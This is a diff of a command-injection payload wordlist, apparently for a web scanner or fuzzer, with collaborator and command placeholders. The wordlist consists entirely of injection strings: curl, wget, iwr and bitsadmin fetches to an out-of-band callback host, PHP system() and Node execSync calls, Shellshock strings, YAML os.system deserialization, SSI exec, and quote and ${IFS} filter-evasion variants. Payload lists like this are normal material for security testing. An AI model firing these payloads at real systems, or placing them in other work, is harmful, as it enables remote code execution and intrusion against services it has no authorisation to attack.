-`ping !-VARIABLE_COLLABORATOR-!`
+`ping !-VARIABLE_COLLABORATOR_WITHOUT_HTTP-!`
 `curl !-VARIABLE_COLLABORATOR-!:80/rce_curl.txt`
 `wget !-VARIABLE_COLLABORATOR-!:80/rce_curl.txt`
 `iwr !-VARIABLE_COLLABORATOR-!:80/iwr.txt -OutFile iwr.txt`
 `bitsadmin /transfer oob_test /priority high !-VARIABLE_COLLABORATOR-!:80/bitsadmin.txt %temp%\bitsadmin.txt`
 `fetch !-VARIABLE_COLLABORATOR-!:80/fetch.txt`
-`ping !-VARIABLE_COLLABORATOR-!`
+`ping !-VARIABLE_COLLABORATOR_WITHOUT_HTTP-!`
 (curl !-VARIABLE_COLLABORATOR-!/rce_curl.txt)
 (wget !-VARIABLE_COLLABORATOR-!/rce_curl.txt)
 (iwr !-VARIABLE_COLLABORATOR-!/iwr.txt -OutFile iwr.txt)
 (bitsadmin /transfer oob_test /priority high !-VARIABLE_COLLABORATOR-!/bitsadmin.txt %temp%\bitsadmin.txt)
 (fetch !-VARIABLE_COLLABORATOR-!/fetch.txt)
-(ping !-VARIABLE_COLLABORATOR-!)
+(ping !-VARIABLE_COLLABORATOR_WITHOUT_HTTP-!)
 (curl !-VARIABLE_COLLABORATOR-!:80/rce_curl.txt)
 (wget !-VARIABLE_COLLABORATOR-!:80/rce_curl.txt)
 (iwr !-VARIABLE_COLLABORATOR-!:80/iwr.txt -OutFile iwr.txt)
 (bitsadmin /transfer oob_test /priority high !-VARIABLE_COLLABORATOR-!:80/bitsadmin.txt %temp%\bitsadmin.txt)
 (fetch !-VARIABLE_COLLABORATOR-!:80/fetch.txt)
-(ping !-VARIABLE_COLLABORATOR-!)
+(ping !-VARIABLE_COLLABORATOR_WITHOUT_HTTP-!)
 {curl !-VARIABLE_COLLABORATOR-!/rce_curl.txt}
 {wget !-VARIABLE_COLLABORATOR-!/rce_curl.txt}
 {iwr !-VARIABLE_COLLABORATOR-!/iwr.txt -OutFile iwr.txt}
 {bitsadmin /transfer oob_test /priority high !-VARIABLE_COLLABORATOR-!/bitsadmin.txt %temp%\bitsadmin.txt}
 {fetch !-VARIABLE_COLLABORATOR-!/fetch.txt}
-{ping !-VARIABLE_COLLABORATOR-!}
+{ping !-VARIABLE_COLLABORATOR_WITHOUT_HTTP-!}
 {curl !-VARIABLE_COLLABORATOR-!:80/rce_curl.txt}
 {wget !-VARIABLE_COLLABORATOR-!:80/rce_curl.txt}
 {iwr !-VARIABLE_COLLABORATOR-!:80/iwr.txt -OutFile iwr.txt}
 {bitsadmin /transfer oob_test /priority high !-VARIABLE_COLLABORATOR-!:80/bitsadmin.txt %temp%\bitsadmin.txt}
 {fetch !-VARIABLE_COLLABORATOR-!:80/fetch.txt}
-{ping !-VARIABLE_COLLABORATOR-!}
+{ping !-VARIABLE_COLLABORATOR_WITHOUT_HTTP-!}
 $(curl !-VARIABLE_COLLABORATOR-!/rce_curl.txt)
 $(wget !-VARIABLE_COLLABORATOR-!/rce_curl.txt)
 $(iwr !-VARIABLE_COLLABORATOR-!/iwr.txt -OutFile iwr.txt)
 $(bitsadmin /transfer oob_test /priority high !-VARIABLE_COLLABORATOR-!/bitsadmin.txt %temp%\bitsadmin.txt)
 $(fetch !-VARIABLE_COLLABORATOR-!/fetch.txt)
-$(ping !-VARIABLE_COLLABORATOR-!)
+$(ping !-VARIABLE_COLLABORATOR_WITHOUT_HTTP-!)
 $(curl !-VARIABLE_COLLABORATOR-!:80/rce_curl.txt)
 $(wget !-VARIABLE_COLLABORATOR-!:80/rce_curl.txt)
 $(iwr !-VARIABLE_COLLABORATOR-!:80/iwr.txt -OutFile iwr.txt)
 $(bitsadmin /transfer oob_test /priority high !-VARIABLE_COLLABORATOR-!:80/bitsadmin.txt %temp%\bitsadmin.txt)
 $(fetch !-VARIABLE_COLLABORATOR-!:80/fetch.txt)
-$(ping !-VARIABLE_COLLABORATOR-!)
+$(ping !-VARIABLE_COLLABORATOR_WITHOUT_HTTP-!)
 $(`curl !-VARIABLE_COLLABORATOR-!/rce_curl.txt`)
 $(`wget !-VARIABLE_COLLABORATOR-!/rce_curl.txt`)
 $(`iwr !-VARIABLE_COLLABORATOR-!/iwr.txt -OutFile iwr.txt`)
 $(`bitsadmin /transfer oob_test /priority high !-VARIABLE_COLLABORATOR-!/bitsadmin.txt %temp%\bitsadmin.txt`)
 $(`fetch !-VARIABLE_COLLABORATOR-!/fetch.txt`)
-$(`ping !-VARIABLE_COLLABORATOR-!`)
+$(`ping !-VARIABLE_COLLABORATOR_WITHOUT_HTTP-!`)
 $(`curl !-VARIABLE_COLLABORATOR-!:80/rce_curl.txt`)
 $(`wget !-VARIABLE_COLLABORATOR-!:80/rce_curl.txt`)
 $(`iwr !-VARIABLE_COLLABORATOR-!:80/iwr.txt -OutFile iwr.txt`)
 $(`bitsadmin /transfer oob_test /priority high !-VARIABLE_COLLABORATOR-!:80/bitsadmin.txt %temp%\bitsadmin.txt`)
 $(`fetch !-VARIABLE_COLLABORATOR-!:80/fetch.txt`)
-$(`ping !-VARIABLE_COLLABORATOR-!`)
+$(`ping !-VARIABLE_COLLABORATOR_WITHOUT_HTTP-!`)
 system'(curl !-VARIABLE_COLLABORATOR-!/rce_curl.txt')
 system'(wget !-VARIABLE_COLLABORATOR-!/rce_curl.txt')
 system'(iwr !-VARIABLE_COLLABORATOR-!/iwr.txt -OutFile iwr.txt')
 system'(bitsadmin /transfer oob_test /priority high !-VARIABLE_COLLABORATOR-!/bitsadmin.txt %temp%\bitsadmin.txt')
 system'(fetch !-VARIABLE_COLLABORATOR-!/fetch.txt')
-system'(ping !-VARIABLE_COLLABORATOR-!')
+system'(ping !-VARIABLE_COLLABORATOR_WITHOUT_HTTP-!')
 system'(curl !-VARIABLE_COLLABORATOR-!:80/rce_curl.txt')
 system'(wget !-VARIABLE_COLLABORATOR-!:80/rce_curl.txt')
 system'(iwr !-VARIABLE_COLLABORATOR-!:80/iwr.txt -OutFile iwr.txt')
 system'(bitsadmin /transfer oob_test /priority high !-VARIABLE_COLLABORATOR-!:80/bitsadmin.txt %temp%\bitsadmin.txt')
 system'(fetch !-VARIABLE_COLLABORATOR-!:80/fetch.txt')
-system'(ping !-VARIABLE_COLLABORATOR-!')
+system'(ping !-VARIABLE_COLLABORATOR_WITHOUT_HTTP-!')
 <?php system("curl !-VARIABLE_COLLABORATOR-!/rce_curl.txt");?>
 <?php system("wget !-VARIABLE_COLLABORATOR-!/rce_curl.txt");?>
 <?php system("iwr !-VARIABLE_COLLABORATOR-!/iwr.txt -OutFile iwr.txt");?>
 <?php system("bitsadmin /transfer oob_test /priority high !-VARIABLE_COLLABORATOR-!/bitsadmin.txt %temp%\bitsadmin.txt");?>
 <?php system("fetch !-VARIABLE_COLLABORATOR-!/fetch.txt");?>
-<?php system("ping !-VARIABLE_COLLABORATOR-!");?>
+<?php system("ping !-VARIABLE_COLLABORATOR_WITHOUT_HTTP-!");?>
 <?php system("curl !-VARIABLE_COLLABORATOR-!:80/rce_curl.txt");?>
 <?php system("wget !-VARIABLE_COLLABORATOR-!:80/rce_curl.txt");?>
 <?php system("iwr !-VARIABLE_COLLABORATOR-!:80/iwr.txt -OutFile iwr.txt");?>
 <?php system("bitsadmin /transfer oob_test /priority high !-VARIABLE_COLLABORATOR-!:80/bitsadmin.txt %temp%\bitsadmin.txt");?>
 <?php system("fetch !-VARIABLE_COLLABORATOR-!:80/fetch.txt");?>
-<?php system("ping !-VARIABLE_COLLABORATOR-!");?>
+<?php system("ping !-VARIABLE_COLLABORATOR_WITHOUT_HTTP-!");?>
 ){this.global.process.mainModule.require("child_process").execSync("curl !-VARIABLE_COLLABORATOR-!/rce_curl.txt")}; with(obj
 ){this.global.process.mainModule.require("child_process").execSync("wget !-VARIABLE_COLLABORATOR-!/rce_curl.txt")}; with(obj
 ){this.global.process.mainModule.require("child_process").execSync("iwr !-VARIABLE_COLLABORATOR-!/iwr.txt -OutFile iwr.txt")}; with(obj
 ){this.global.process.mainModule.require("child_process").execSync("bitsadmin /transfer oob_test /priority high !-VARIABLE_COLLABORATOR-!/bitsadmin.txt %temp%\bitsadmin.txt")}; with(obj
 ){this.global.process.mainModule.require("child_process").execSync("fetch !-VARIABLE_COLLABORATOR-!/fetch.txt")}; with(obj
-){this.global.process.mainModule.require("child_process").execSync("ping !-VARIABLE_COLLABORATOR-!")}; with(obj
+){this.global.process.mainModule.require("child_process").execSync("ping !-VARIABLE_COLLABORATOR_WITHOUT_HTTP-!")}; with(obj
 ){this.global.process.mainModule.require("child_process").execSync("curl !-VARIABLE_COLLABORATOR-!:80/rce_curl.txt")}; with(obj
 ){this.global.process.mainModule.require("child_process").execSync("wget !-VARIABLE_COLLABORATOR-!:80/rce_curl.txt")}; with(obj
 ){this.global.process.mainModule.require("child_process").execSync("iwr !-VARIABLE_COLLABORATOR-!:80/iwr.txt -OutFile iwr.txt")}; with(obj
 ){this.global.process.mainModule.require("child_process").execSync("bitsadmin /transfer oob_test /priority high !-VARIABLE_COLLABORATOR-!:80/bitsadmin.txt %temp%\bitsadmin.txt")}; with(obj
 ){this.global.process.mainModule.require("child_process").execSync("fetch !-VARIABLE_COLLABORATOR-!:80/fetch.txt")}; with(obj
-){this.global.process.mainModule.require("child_process").execSync("ping !-VARIABLE_COLLABORATOR-!")}; with(obj
+){this.global.process.mainModule.require("child_process").execSync("ping !-VARIABLE_COLLABORATOR_WITHOUT_HTTP-!")}; with(obj
 $(curl${IFS}!-VARIABLE_COLLABORATOR-!)
 $(ping${IFS}-c2${IFS}!-VARIABLE_COLLABORATOR-!)
 %0acurl${IFS}!-VARIABLE_COLLABORATOR-!
-%0aping !-VARIABLE_COLLABORATOR-!
+%0aping !-VARIABLE_COLLABORATOR_WITHOUT_HTTP-!
 %0aping${IFS}-c2${IFS}!-VARIABLE_COLLABORATOR-!
 &&curl${IFS}!-VARIABLE_COLLABORATOR-!
 &&n"s"l"o"o"k"u"p" !-VARIABLE_COLLABORATOR-!
 &&n's'l'o'o'k'u'p' !-VARIABLE_COLLABORATOR-!
 &&p"i"n"g" !-VARIABLE_COLLABORATOR-!
 &&p'i'n'g' !-VARIABLE_COLLABORATOR-!
-&&ping !-VARIABLE_COLLABORATOR-!
+&&ping !-VARIABLE_COLLABORATOR_WITHOUT_HTTP-!
 &&ping${IFS}-c2${IFS}!-VARIABLE_COLLABORATOR-!
 &curl${IFS}!-VARIABLE_COLLABORATOR-!
 &n"s"l"o"o"k"u"p" !-VARIABLE_COLLABORATOR-!
 &n's'l'o'o'k'u'p' !-VARIABLE_COLLABORATOR-!
 &p"i"n"g" !-VARIABLE_COLLABORATOR-!
 &p'i'n'g' !-VARIABLE_COLLABORATOR-!
-&ping !-VARIABLE_COLLABORATOR-!
+&ping !-VARIABLE_COLLABORATOR_WITHOUT_HTTP-!
 &ping${IFS}-c2${IFS}!-VARIABLE_COLLABORATOR-!
 ;curl${IFS}!-VARIABLE_COLLABORATOR-!
 ;n"s"l"o"o"k"u"p" !-VARIABLE_COLLABORATOR-!
 ;n's'l'o'o'k'u'p' !-VARIABLE_COLLABORATOR-!
 ;p"i"n"g" !-VARIABLE_COLLABORATOR-!
 ;p'i'n'g' !-VARIABLE_COLLABORATOR-!
-;ping !-VARIABLE_COLLABORATOR-!
+;ping !-VARIABLE_COLLABORATOR_WITHOUT_HTTP-!
 ;ping${IFS}-c2${IFS}!-VARIABLE_COLLABORATOR-!
 `curl${IFS}!-VARIABLE_COLLABORATOR-!`
 `ping${IFS}-c2${IFS}!-VARIABLE_COLLABORATOR-!`
@@ -1620,14 +1620,14 @@ $(ping${IFS}-c2${IFS}!-VARIABLE_COLLABORATOR-!)
 |n's'l'o'o'k'u'p' !-VARIABLE_COLLABORATOR-!
 |p"i"n"g" !-VARIABLE_COLLABORATOR-!
 |p'i'n'g' !-VARIABLE_COLLABORATOR-!
-|ping !-VARIABLE_COLLABORATOR-!
+|ping !-VARIABLE_COLLABORATOR_WITHOUT_HTTP-!
 |ping${IFS}-c2${IFS}!-VARIABLE_COLLABORATOR-!
 ||curl${IFS}!-VARIABLE_COLLABORATOR-!
 ||n"s"l"o"o"k"u"p" !-VARIABLE_COLLABORATOR-!
 ||n's'l'o'o'k'u'p' !-VARIABLE_COLLABORATOR-!
 ||p"i"n"g" !-VARIABLE_COLLABORATOR-!
 ||p'i'n'g' !-VARIABLE_COLLABORATOR-!
-||ping !-VARIABLE_COLLABORATOR-!
+||ping !-VARIABLE_COLLABORATOR_WITHOUT_HTTP-!
 ||ping${IFS}-c2${IFS}!-VARIABLE_COLLABORATOR-!
 {${sleep(20)}}&
 {${sleep(20)}}&&
@@ -2765,3 +2765,1494 @@ $(ping -c 20 127.0.0.1)
 `ping -c 20 127.0.0.1`
 {ping -c 20 127.0.0.1}
 ${`ping -c 20 127.0.0.1`}
+!-VARIABLE_COMMAND-!&
+!-VARIABLE_COMMAND-!&&
+!-VARIABLE_COMMAND-!|
+!-VARIABLE_COMMAND-!||
+!-VARIABLE_COMMAND-!;
+!-VARIABLE_COMMAND-!%00
+!-VARIABLE_COMMAND-!#
+`!-VARIABLE_COMMAND-!`&
+`!-VARIABLE_COMMAND-!`&&
+`!-VARIABLE_COMMAND-!`|
+`!-VARIABLE_COMMAND-!`||
+`!-VARIABLE_COMMAND-!`;
+`!-VARIABLE_COMMAND-!`%00
+`!-VARIABLE_COMMAND-!`#
+(!-VARIABLE_COMMAND-!)&
+(!-VARIABLE_COMMAND-!)&&
+(!-VARIABLE_COMMAND-!)|
+(!-VARIABLE_COMMAND-!)||
+(!-VARIABLE_COMMAND-!);
+(!-VARIABLE_COMMAND-!)%00
+(!-VARIABLE_COMMAND-!)#
+$(!-VARIABLE_COMMAND-!)&
+$(!-VARIABLE_COMMAND-!)&&
+$(!-VARIABLE_COMMAND-!)|
+$(!-VARIABLE_COMMAND-!)||
+$(!-VARIABLE_COMMAND-!);
+$(!-VARIABLE_COMMAND-!)%00
+$(!-VARIABLE_COMMAND-!)#
+{!-VARIABLE_COMMAND-!}&
+{!-VARIABLE_COMMAND-!}&&
+{!-VARIABLE_COMMAND-!}|
+{!-VARIABLE_COMMAND-!}||
+{!-VARIABLE_COMMAND-!};
+{!-VARIABLE_COMMAND-!}%00
+{!-VARIABLE_COMMAND-!}#
+$(`!-VARIABLE_COMMAND-!`)&
+$(`!-VARIABLE_COMMAND-!`)&&
+$(`!-VARIABLE_COMMAND-!`)|
+$(`!-VARIABLE_COMMAND-!`)||
+$(`!-VARIABLE_COMMAND-!`);
+$(`!-VARIABLE_COMMAND-!`)%00
+$(`!-VARIABLE_COMMAND-!`)#
+{${phpinfo()}}&
+{${phpinfo()}}&&
+{${phpinfo()}}|
+{${phpinfo()}}||
+{${phpinfo()}};
+{${phpinfo()}}%00
+{${phpinfo()}}#
+${@print("RCEVulnerable")}&
+${@print("RCEVulnerable")}&&
+${@print("RCEVulnerable")}|
+${@print("RCEVulnerable")}||
+${@print("RCEVulnerable")};
+${@print("RCEVulnerable")}%00
+${@print("RCEVulnerable")}#
+/usr/bin/id&
+/usr/bin/id&&
+/usr/bin/id|
+/usr/bin/id||
+/usr/bin/id;
+/usr/bin/id%00
+/usr/bin/id#
+{2136} + {1}&
+{2136} + {1}&&
+{2136} + {1}|
+{2136} + {1}||
+{2136} + {1};
+{2136} + {1}%00
+{2136} + {1}#
+{2136+1}&
+{2136+1}&&
+{2136+1}|
+{2136+1}||
+{2136+1};
+{2136+1}%00
+{2136+1}#
+() { :;}; /bin/bash -c "!-VARIABLE_COMMAND-!"&
+() { :;}; /bin/bash -c "!-VARIABLE_COMMAND-!"&&
+() { :;}; /bin/bash -c "!-VARIABLE_COMMAND-!"|
+() { :;}; /bin/bash -c "!-VARIABLE_COMMAND-!"||
+() { :;}; /bin/bash -c "!-VARIABLE_COMMAND-!";
+() { :;}; /bin/bash -c "!-VARIABLE_COMMAND-!"%00
+() { :;}; /bin/bash -c "!-VARIABLE_COMMAND-!"#
+() { :;}; !-VARIABLE_COMMAND-!&
+() { :;}; !-VARIABLE_COMMAND-!&&
+() { :;}; !-VARIABLE_COMMAND-!|
+() { :;}; !-VARIABLE_COMMAND-!||
+() { :;}; !-VARIABLE_COMMAND-!;
+() { :;}; !-VARIABLE_COMMAND-!%00
+() { :;}; !-VARIABLE_COMMAND-!#
+eval('!-VARIABLE_COMMAND-!')&
+eval('!-VARIABLE_COMMAND-!')&&
+eval('!-VARIABLE_COMMAND-!')|
+eval('!-VARIABLE_COMMAND-!')||
+eval('!-VARIABLE_COMMAND-!');
+eval('!-VARIABLE_COMMAND-!')%00
+eval('!-VARIABLE_COMMAND-!')#
+<!--#exec cmd="/usr/bin/id;-->&
+<!--#exec cmd="/usr/bin/id;-->&&
+<!--#exec cmd="/usr/bin/id;-->|
+<!--#exec cmd="/usr/bin/id;-->||
+<!--#exec cmd="/usr/bin/id;-->;
+<!--#exec cmd="/usr/bin/id;-->%00
+<!--#exec cmd="/usr/bin/id;-->#
+perl -e 'print "X"x8192'&
+perl -e 'print "X"x8192'&&
+perl -e 'print "X"x8192'|
+perl -e 'print "X"x8192'||
+perl -e 'print "X"x8192';
+perl -e 'print "X"x8192'%00
+perl -e 'print "X"x8192'#
+<?php system("!-VARIABLE_COMMAND-!");?>&
+<?php system("!-VARIABLE_COMMAND-!");?>&&
+<?php system("!-VARIABLE_COMMAND-!");?>|
+<?php system("!-VARIABLE_COMMAND-!");?>||
+<?php system("!-VARIABLE_COMMAND-!");?>;
+<?php system("!-VARIABLE_COMMAND-!");?>%00
+<?php system("!-VARIABLE_COMMAND-!");?>#
+!!python/object/apply:os.system["!-VARIABLE_COMMAND-!"]&
+!!python/object/apply:os.system["!-VARIABLE_COMMAND-!"]&&
+!!python/object/apply:os.system["!-VARIABLE_COMMAND-!"]|
+!!python/object/apply:os.system["!-VARIABLE_COMMAND-!"]||
+!!python/object/apply:os.system["!-VARIABLE_COMMAND-!"];
+!!python/object/apply:os.system["!-VARIABLE_COMMAND-!"]%00
+!!python/object/apply:os.system["!-VARIABLE_COMMAND-!"]#
+w\ho\am\i&
+w\ho\am\i&&
+w\ho\am\i|
+w\ho\am\i||
+w\ho\am\i;
+w\ho\am\i%00
+w\ho\am\i#
+w'h'o'am'i&
+w'h'o'am'i&&
+w'h'o'am'i|
+w'h'o'am'i||
+w'h'o'am'i;
+w'h'o'am'i%00
+w'h'o'am'i#
+system('!-VARIABLE_COMMAND-!')&
+system('!-VARIABLE_COMMAND-!')&&
+system('!-VARIABLE_COMMAND-!')|
+system('!-VARIABLE_COMMAND-!')||
+system('!-VARIABLE_COMMAND-!');
+system('!-VARIABLE_COMMAND-!')%00
+system('!-VARIABLE_COMMAND-!')#
+'!-VARIABLE_COMMAND-!&
+'!-VARIABLE_COMMAND-!&&
+'!-VARIABLE_COMMAND-!|
+'!-VARIABLE_COMMAND-!||
+'!-VARIABLE_COMMAND-!;
+'!-VARIABLE_COMMAND-!%00
+'!-VARIABLE_COMMAND-!#
+'`!-VARIABLE_COMMAND-!`&
+'`!-VARIABLE_COMMAND-!`&&
+'`!-VARIABLE_COMMAND-!`|
+'`!-VARIABLE_COMMAND-!`||
+'`!-VARIABLE_COMMAND-!`;
+'`!-VARIABLE_COMMAND-!`%00
+'`!-VARIABLE_COMMAND-!`#
+'(!-VARIABLE_COMMAND-!)&
+'(!-VARIABLE_COMMAND-!)&&
+'(!-VARIABLE_COMMAND-!)|
+'(!-VARIABLE_COMMAND-!)||
+'(!-VARIABLE_COMMAND-!);
+'(!-VARIABLE_COMMAND-!)%00
+'(!-VARIABLE_COMMAND-!)#
+'$(!-VARIABLE_COMMAND-!)&
+'$(!-VARIABLE_COMMAND-!)&&
+'$(!-VARIABLE_COMMAND-!)|
+'$(!-VARIABLE_COMMAND-!)||
+'$(!-VARIABLE_COMMAND-!);
+'$(!-VARIABLE_COMMAND-!)%00
+'$(!-VARIABLE_COMMAND-!)#
+'{!-VARIABLE_COMMAND-!}&
+'{!-VARIABLE_COMMAND-!}&&
+'{!-VARIABLE_COMMAND-!}|
+'{!-VARIABLE_COMMAND-!}||
+'{!-VARIABLE_COMMAND-!};
+'{!-VARIABLE_COMMAND-!}%00
+'{!-VARIABLE_COMMAND-!}#
+'$(`!-VARIABLE_COMMAND-!`)&
+'$(`!-VARIABLE_COMMAND-!`)&&
+'$(`!-VARIABLE_COMMAND-!`)|
+'$(`!-VARIABLE_COMMAND-!`)||
+'$(`!-VARIABLE_COMMAND-!`);
+'$(`!-VARIABLE_COMMAND-!`)%00
+'$(`!-VARIABLE_COMMAND-!`)#
+'{${phpinfo()}}&
+'{${phpinfo()}}&&
+'{${phpinfo()}}|
+'{${phpinfo()}}||
+'{${phpinfo()}};
+'{${phpinfo()}}%00
+'{${phpinfo()}}#
+'${@print("RCEVulnerable")}&
+'${@print("RCEVulnerable")}&&
+'${@print("RCEVulnerable")}|
+'${@print("RCEVulnerable")}||
+'${@print("RCEVulnerable")};
+'${@print("RCEVulnerable")}%00
+'${@print("RCEVulnerable")}#
+'/usr/bin/id&
+'/usr/bin/id&&
+'/usr/bin/id|
+'/usr/bin/id||
+'/usr/bin/id;
+'/usr/bin/id%00
+'/usr/bin/id#
+'{2136} + {1}&
+'{2136} + {1}&&
+'{2136} + {1}|
+'{2136} + {1}||
+'{2136} + {1};
+'{2136} + {1}%00
+'{2136} + {1}#
+'{2136+1}&
+'{2136+1}&&
+'{2136+1}|
+'{2136+1}||
+'{2136+1};
+'{2136+1}%00
+'{2136+1}#
+'() { :;}; /bin/bash -c "!-VARIABLE_COMMAND-!"&
+'() { :;}; /bin/bash -c "!-VARIABLE_COMMAND-!"&&
+'() { :;}; /bin/bash -c "!-VARIABLE_COMMAND-!"|
+'() { :;}; /bin/bash -c "!-VARIABLE_COMMAND-!"||
+'() { :;}; /bin/bash -c "!-VARIABLE_COMMAND-!";
+'() { :;}; /bin/bash -c "!-VARIABLE_COMMAND-!"%00
+'() { :;}; /bin/bash -c "!-VARIABLE_COMMAND-!"#
+'() { :;}; !-VARIABLE_COMMAND-!&
+'() { :;}; !-VARIABLE_COMMAND-!&&
+'() { :;}; !-VARIABLE_COMMAND-!|
+'() { :;}; !-VARIABLE_COMMAND-!||
+'() { :;}; !-VARIABLE_COMMAND-!;
+'() { :;}; !-VARIABLE_COMMAND-!%00
+'() { :;}; !-VARIABLE_COMMAND-!#
+'eval('!-VARIABLE_COMMAND-!')&
+'eval('!-VARIABLE_COMMAND-!')&&
+'eval('!-VARIABLE_COMMAND-!')|
+'eval('!-VARIABLE_COMMAND-!')||
+'eval('!-VARIABLE_COMMAND-!');
+'eval('!-VARIABLE_COMMAND-!')%00
+'eval('!-VARIABLE_COMMAND-!')#
+'<!--#exec cmd="/usr/bin/id;-->&
+'<!--#exec cmd="/usr/bin/id;-->&&
+'<!--#exec cmd="/usr/bin/id;-->|
+'<!--#exec cmd="/usr/bin/id;-->||
+'<!--#exec cmd="/usr/bin/id;-->;
+'<!--#exec cmd="/usr/bin/id;-->%00
+'<!--#exec cmd="/usr/bin/id;-->#
+'perl -e 'print "X"x8192'&
+'perl -e 'print "X"x8192'&&
+'perl -e 'print "X"x8192'|
+'perl -e 'print "X"x8192'||
+'perl -e 'print "X"x8192';
+'perl -e 'print "X"x8192'%00
+'perl -e 'print "X"x8192'#
+'<?php system("!-VARIABLE_COMMAND-!");?>&
+'<?php system("!-VARIABLE_COMMAND-!");?>&&
+'<?php system("!-VARIABLE_COMMAND-!");?>|
+'<?php system("!-VARIABLE_COMMAND-!");?>||
+'<?php system("!-VARIABLE_COMMAND-!");?>;
+'<?php system("!-VARIABLE_COMMAND-!");?>%00
+'<?php system("!-VARIABLE_COMMAND-!");?>#
+'!!python/object/apply:os.system["!-VARIABLE_COMMAND-!"]&
+'!!python/object/apply:os.system["!-VARIABLE_COMMAND-!"]&&
+'!!python/object/apply:os.system["!-VARIABLE_COMMAND-!"]|
+'!!python/object/apply:os.system["!-VARIABLE_COMMAND-!"]||
+'!!python/object/apply:os.system["!-VARIABLE_COMMAND-!"];
+'!!python/object/apply:os.system["!-VARIABLE_COMMAND-!"]%00
+'!!python/object/apply:os.system["!-VARIABLE_COMMAND-!"]#
+'w\ho\am\i&
+'w\ho\am\i&&
+'w\ho\am\i|
+'w\ho\am\i||
+'w\ho\am\i;
+'w\ho\am\i%00
+'w\ho\am\i#
+'w'h'o'am'i&
+'w'h'o'am'i&&
+'w'h'o'am'i|
+'w'h'o'am'i||
+'w'h'o'am'i;
+'w'h'o'am'i%00
+'w'h'o'am'i#
+'system('!-VARIABLE_COMMAND-!')&
+'system('!-VARIABLE_COMMAND-!')&&
+'system('!-VARIABLE_COMMAND-!')|
+'system('!-VARIABLE_COMMAND-!')||
+'system('!-VARIABLE_COMMAND-!');
+'system('!-VARIABLE_COMMAND-!')%00
+'system('!-VARIABLE_COMMAND-!')#
+"!-VARIABLE_COMMAND-!&
+"!-VARIABLE_COMMAND-!&&
+"!-VARIABLE_COMMAND-!|
+"!-VARIABLE_COMMAND-!||
+"!-VARIABLE_COMMAND-!;
+"!-VARIABLE_COMMAND-!%00
+"!-VARIABLE_COMMAND-!#
+"`!-VARIABLE_COMMAND-!`&
+"`!-VARIABLE_COMMAND-!`&&
+"`!-VARIABLE_COMMAND-!`|
+"`!-VARIABLE_COMMAND-!`||
+"`!-VARIABLE_COMMAND-!`;
+"`!-VARIABLE_COMMAND-!`%00
+"`!-VARIABLE_COMMAND-!`#
+"(!-VARIABLE_COMMAND-!)&
+"(!-VARIABLE_COMMAND-!)&&
+"(!-VARIABLE_COMMAND-!)|
+"(!-VARIABLE_COMMAND-!)||
+"(!-VARIABLE_COMMAND-!);
+"(!-VARIABLE_COMMAND-!)%00
+"(!-VARIABLE_COMMAND-!)#
+"$(!-VARIABLE_COMMAND-!)&
+"$(!-VARIABLE_COMMAND-!)&&
+"$(!-VARIABLE_COMMAND-!)|
+"$(!-VARIABLE_COMMAND-!)||
+"$(!-VARIABLE_COMMAND-!);
+"$(!-VARIABLE_COMMAND-!)%00
+"$(!-VARIABLE_COMMAND-!)#
+"{!-VARIABLE_COMMAND-!}&
+"{!-VARIABLE_COMMAND-!}&&
+"{!-VARIABLE_COMMAND-!}|
+"{!-VARIABLE_COMMAND-!}||
+"{!-VARIABLE_COMMAND-!};
+"{!-VARIABLE_COMMAND-!}%00
+"{!-VARIABLE_COMMAND-!}#
+"$(`!-VARIABLE_COMMAND-!`)&
+"$(`!-VARIABLE_COMMAND-!`)&&
+"$(`!-VARIABLE_COMMAND-!`)|
+"$(`!-VARIABLE_COMMAND-!`)||
+"$(`!-VARIABLE_COMMAND-!`);
+"$(`!-VARIABLE_COMMAND-!`)%00
+"$(`!-VARIABLE_COMMAND-!`)#
+"{${phpinfo()}}&
+"{${phpinfo()}}&&
+"{${phpinfo()}}|
+"{${phpinfo()}}||
+"{${phpinfo()}};
+"{${phpinfo()}}%00
+"{${phpinfo()}}#
+"${@print("RCEVulnerable")}&
+"${@print("RCEVulnerable")}&&
+"${@print("RCEVulnerable")}|
+"${@print("RCEVulnerable")}||
+"${@print("RCEVulnerable")};
+"${@print("RCEVulnerable")}%00
+"${@print("RCEVulnerable")}#
+"/usr/bin/id&
+"/usr/bin/id&&
+"/usr/bin/id|
+"/usr/bin/id||
+"/usr/bin/id;
+"/usr/bin/id%00
+"/usr/bin/id#
+"{2136} + {1}&
+"{2136} + {1}&&
+"{2136} + {1}|
+"{2136} + {1}||
+"{2136} + {1};
+"{2136} + {1}%00
+"{2136} + {1}#
+"{2136+1}&
+"{2136+1}&&
+"{2136+1}|
+"{2136+1}||
+"{2136+1};
+"{2136+1}%00
+"{2136+1}#
+"() { :;}; /bin/bash -c "!-VARIABLE_COMMAND-!"&
+"() { :;}; /bin/bash -c "!-VARIABLE_COMMAND-!"&&
+"() { :;}; /bin/bash -c "!-VARIABLE_COMMAND-!"|
+"() { :;}; /bin/bash -c "!-VARIABLE_COMMAND-!"||
+"() { :;}; /bin/bash -c "!-VARIABLE_COMMAND-!";
+"() { :;}; /bin/bash -c "!-VARIABLE_COMMAND-!"%00
+"() { :;}; /bin/bash -c "!-VARIABLE_COMMAND-!"#
+"() { :;}; !-VARIABLE_COMMAND-!&
+"() { :;}; !-VARIABLE_COMMAND-!&&
+"() { :;}; !-VARIABLE_COMMAND-!|
+"() { :;}; !-VARIABLE_COMMAND-!||
+"() { :;}; !-VARIABLE_COMMAND-!;
+"() { :;}; !-VARIABLE_COMMAND-!%00
+"() { :;}; !-VARIABLE_COMMAND-!#
+"eval('!-VARIABLE_COMMAND-!')&
+"eval('!-VARIABLE_COMMAND-!')&&
+"eval('!-VARIABLE_COMMAND-!')|
+"eval('!-VARIABLE_COMMAND-!')||
+"eval('!-VARIABLE_COMMAND-!');
+"eval('!-VARIABLE_COMMAND-!')%00
+"eval('!-VARIABLE_COMMAND-!')#
+"<!--#exec cmd="/usr/bin/id;-->&
+"<!--#exec cmd="/usr/bin/id;-->&&
+"<!--#exec cmd="/usr/bin/id;-->|
+"<!--#exec cmd="/usr/bin/id;-->||
+"<!--#exec cmd="/usr/bin/id;-->;
+"<!--#exec cmd="/usr/bin/id;-->%00
+"<!--#exec cmd="/usr/bin/id;-->#
+"perl -e 'print "X"x8192'&
+"perl -e 'print "X"x8192'&&
+"perl -e 'print "X"x8192'|
+"perl -e 'print "X"x8192'||
+"perl -e 'print "X"x8192';
+"perl -e 'print "X"x8192'%00
+"perl -e 'print "X"x8192'#
+"<?php system("!-VARIABLE_COMMAND-!");?>&
+"<?php system("!-VARIABLE_COMMAND-!");?>&&
+"<?php system("!-VARIABLE_COMMAND-!");?>|
+"<?php system("!-VARIABLE_COMMAND-!");?>||
